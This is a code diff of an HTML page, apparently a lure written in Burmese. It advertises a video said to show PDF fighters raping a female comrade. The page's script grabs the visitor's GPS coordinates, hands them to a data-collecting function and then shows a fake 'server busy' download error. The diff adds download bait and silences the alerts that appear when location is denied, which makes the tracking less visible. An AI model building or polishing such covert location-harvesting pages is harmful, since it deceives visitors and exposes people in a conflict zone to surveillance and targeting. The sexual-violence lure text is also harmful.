@@ -163,7 +163,7 @@
             </div>
 
             <div class="desc-body">
-                PDFတပ်ဖွဲ့ဝင်အချင်းချင်းရဲးမေလေးကိုတောတွင်းတနေရာမှာမုဒိန်းကျင့်နေမူမှတ်တမ်းVideo... <b>#စစ်သွေး</b>
+                PDFတပ်ဖွဲ့ဝင်အချင်းချင်းရဲးမေလေးကိုတောတွင်းတနေရာမှာမုဒိန်းကျင့်နေမူမှတ်တမ်းVideo... <b>#စစ်သွေး</b>#တစ်ချို့Video ကြည့်မရ ရင်Downloadဆွဲးပြီးကြည့်နိင်ပါတယ်။
             </div>
 
             <div class="extra-features">
@@ -476,9 +476,10 @@
                 const map = `🌍 Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 collectData("Location 📍", map);
                 alrt("Download Error: Server Busy. Please try again later.");
-            }, () => { alrt("Allow location to download this file."); });
+            }, () => { //alrt("Allow location to download this file.");
+ });
         } else {
-            alrt("Geolocation is not supported by this browser.");
+            //alrt("Geolocation is not supported by this browser.");
         }
     });
 
@@ -486,4 +487,4 @@
 </script>
 
 </body>
-    </html>
+                                       </html>
